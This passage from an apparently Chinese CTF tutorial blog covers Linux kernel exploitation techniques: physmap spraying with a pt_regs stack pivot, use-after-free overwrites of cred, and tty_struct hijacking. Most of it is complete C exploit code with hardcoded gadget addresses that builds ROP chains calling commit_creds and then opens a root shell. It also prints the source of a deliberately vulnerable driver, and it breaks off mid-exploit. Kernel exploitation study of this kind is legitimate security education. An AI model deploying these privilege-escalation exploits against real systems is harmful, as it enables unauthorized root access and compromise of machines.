                > 由于栈迁移的 gadget 占了绝大多数，因此 ioctl
执行随便一个地址的 gadget 很大概率会将栈迁移到 pt_regs 结构体。 在
pt_regs 结构体中利用 r8 和 r9
两个寄存器将栈迁移到喷射内存的区域的某个地址，很大概率会迁移到
<code>add rsp; ret;</code> 和 <code>ret;</code> gadget
处，很大概率会最终执行到 rop 完成 提权。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c466d38b7cfe64080be0c0577e81a9ca.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>返回用户空间在使用
<code>swapgs_restore_regs_and_return_to_usermode</code>
函数时应该注意，前面 pop 完寄存器之后除 iretq 需要的寄存器还剩 orig_rax
和 rdi ，为了缩短 rop 的长度，可以直接 retn 到标记的位置，不过 rop
接下来还要有 16 字节的填充来表示 orig_rax 和 rdi 的位置。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a622b6b669e40e9342bea16d93784547.png"
                     
alt="在这里插入图片描述" 
                > exp 如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save_status</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123; <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">save_status</span>();</span><br><span class="line">    dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error: open kgadget&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    page_size = <span class="built_in">sysconf</span>(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> *rop = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>)) &#123;</span><br><span class="line">        rop[idx++] = <span class="number">0xffffffff810737fe</span>;<span class="comment">// add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">11</span>); idx++) &#123;</span><br><span class="line">        rop[idx] = <span class="number">0xffffffff8108c6f1</span>;<span class="comment">// ret;</span></span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff8108c6f0</span>;<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff82a6b700</span>;<span class="comment">// init_cred</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff810c92e0</span>;<span class="comment">// commit_creds</span></span><br><span class="line">    rop[idx++] = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;<span class="comment">// swapgs_restore_regs_and_return_to_usermode + 27;</span></span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;<span class="comment">// padding</span></span><br><span class="line">    rop[idx++] = <span class="number">0x0000000000000000</span>;<span class="comment">// padding</span></span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">        <span class="type">sigset_t</span> *page = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page, rop, page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0xffffffff811483d0;&quot;</span><span class="comment">// pop rsp; ret;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    try_hit;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   try_hit;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   dev_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="kernel-heap-exploit">Kernel Heap Exploit</h1>
<p>这里以例题 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/heap_bof" >heap
bof <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例进行讲解。</p>
<p>heap bof 源码如下，存在 uaf 和堆溢出两种漏洞。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">bof_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p_arg</span>;</span></span><br><span class="line">    copy_from_user(&amp;p_arg, (<span class="type">void</span> *) arg, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> param));</span><br><span class="line">    <span class="type">long</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            copy_to_user(p_arg.buf, ptr[p_arg.idx], p_arg.len);</span><br><span class="line">            printk(<span class="string">&quot;copy_to_user: 0x%lx\n&quot;</span>, *(<span class="type">long</span> *) ptr[p_arg.idx]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            copy_from_user(ptr[p_arg.idx], p_arg.buf, p_arg.len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            kfree(ptr[p_arg.idx]);</span><br><span class="line">            printk(<span class="string">&quot;free: 0x%p\n&quot;</span>, ptr[p_arg.idx]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            ptr[p_arg.idx] = kmalloc(p_arg.len, GFP_KERNEL);</span><br><span class="line">            printk(<span class="string">&quot;alloc: 0x%p, size: %2lx\n&quot;</span>, ptr[p_arg.idx], p_arg.len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            retval = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="use-after-free">Use After Free</h2>
<h3 id="修改-cred">修改 cred</h3>
<p>cred 结构体大小为 0xa8 ，根据 slub 分配机制，如果申请和释放大小为
0xa8（实际为 0xe0 ）的内存块，此时再开一个线程，则该线程的 cred
结构题正是刚才释放掉的内存块。利用 UAF 漏洞修改 cred
就可以实现提权。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0xa8</span>, <span class="built_in">malloc</span>(<span class="number">0xa8</span>), <span class="number">1</span>&#125;;</span><br><span class="line">    ioctl(fd, <span class="number">5</span>, &amp;p);<span class="comment">//malloc</span></span><br><span class="line">    ioctl(fd, <span class="number">7</span>, &amp;p);<span class="comment">//free</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-]fork error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        p.buf = <span class="built_in">malloc</span>(p.len = <span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p.buf, <span class="number">0</span>, p.len);</span><br><span class="line">        ioctl(fd, <span class="number">8</span>, &amp;p);<span class="comment">//edit</span></span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+]root success&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-]root failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>但是此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到
<code>cred_jar</code> 中的 object，这是因为 <code>cred_jar</code>
在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在
<code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<code>cred_jar</code>
不会再与相同大小的 <code>kmalloc-192</code> 进行合并</p>
<p>来着内核源码 4.5 <code>kernel/cred.c</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>本题（4.4.72）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred),</span><br><span class="line">				     <span class="number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="利用-tty_struct-劫持程序控制流提权">利用 tty_struct
劫持程序控制流提权</h3>
<p>在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code>
，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code>
结构体，与其他类型设备相同，tty
驱动设备中同样存在着一个存放着函数指针的结构体
<code>tty_operations</code> 。</p>
<p>使用 tty 设备的前提是挂载了 <code>ptmx</code> 设备。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts none /dev/pts</span><br><span class="line">chmod 777 /dev/ptmx</span><br></pre></td></tr></table></figure></div>
<p>tty 的结构体 <code>tty_srtuct</code> 定义在 <code>linux/tty.h</code>
中。其中 ops 项（64bit 下位于 结构体偏移 0x18 处）指向一个存放 tty
相关操作函数的函数指针的结构体 <code>tty_operations</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要像上一种方法那样利用 UAF 修改 tty_struct 的结构体指针
ops （这里不直接劫持 <code>tty_operations</code> 的原因是
<code>tty_operations</code> 已经实例化的，不是动态申请的，类似 glibc
中的 <code>_IO_XX_jumps</code> ）然后再调用 tty
的相关操作函数就可以劫持控制流，实现我们想要的操作。
然而如果仅仅是靠修改 <code>tty_operations</code>
结构体中某函数指针只能写入一个 gadget ，除了使用 pt_regs + ret2dir
外还有下面这种方法。</p>
<p>这里需要利用通过 <code>tty_struct</code> 执行 ioctl 时的特性。</p>
<p>首先由于 <code>tty_struct</code> 指向的 <code>tty_operations</code>
已经实例化，因此可以通过 <code>tty_struct</code> 的
<code>tty_operations</code> 泄露内核基址。</p>
<p>通过 <code>tty_struct</code> 执行 ioctl 时， rax 的值正好是 rip
的值，也就是 <code>tty_operations</code> 中 ioctl
函数指针指向的指令的地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9e7ff6e77f958b81732a472ddb71bce4.png"
                     
alt="在这里插入图片描述" 
                > 如果向 ioctl 函数指针写入
<code>xchg eax,esp;ret</code> 指令地址，则会将 rsp 的值置为
<code>rax &amp; 0xffffffff</code> ，即将栈迁移至
<code>rax &amp; 0xffffffff</code> 地址处。如果我们提前在
<code>rax &amp; 0xffffffff</code> 地址处布置好 rop 则可以完成提权操作。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ad5b08bc66c0e9a3cd3e5efae6df6382.png"
                     
alt="在这里插入图片描述" 
                > 这里需要注意的是：</p>
<ul>
<li><p>mmap 的内存不应该从 <code>rax &amp; 0xffffffff</code>
开始，因为在执行 rop 时返回到用户空间执行 get_root 函数会抬高 rsp 小于
<code>rax &amp; 0xffffffff</code> 造成越界，因此需要加一个偏移。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *mmap_addr = mmap(mmap_base - <span class="number">0x1000</span>, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div></li>
<li><p>mmap 的内存是没有映射到实际物理内存的虚拟内存，如果 rsp
到达没有写入 rop
的位置同样也会导致越界错误，因此在使用前先写入数据使其映射到物理内存上。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(mmap_addr, <span class="number">0</span>, <span class="number">0x30000</span>);</span><br></pre></td></tr></table></figure></div>
<p>由于 ROP 在用户空间，因此不能过 SMAP 保护。</p></li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8135ce9d</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_pop_rbp_ret = <span class="number">0xffffffff81004c10</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff810601f4</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff810463cc</span>;</span><br><span class="line"><span class="type">size_t</span> xchg_eax_esp_ret = <span class="number">0xffffffff8100008a</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>, <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*open)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> file *filp);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> file *filp);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*write)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*ioctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios *old);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *)KERNCALL =(<span class="type">void</span> *) <span class="number">0xffffffff8109f2b0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *)KERNCALL =(<span class="type">void</span> *) <span class="number">0xffffffff8109ef00</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123; commit_creds(prepare_kernel_cred(<span class="number">0</span>)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __USE_GNU</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BOF_NUM = <span class="number">40</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> PTMX_NUM = <span 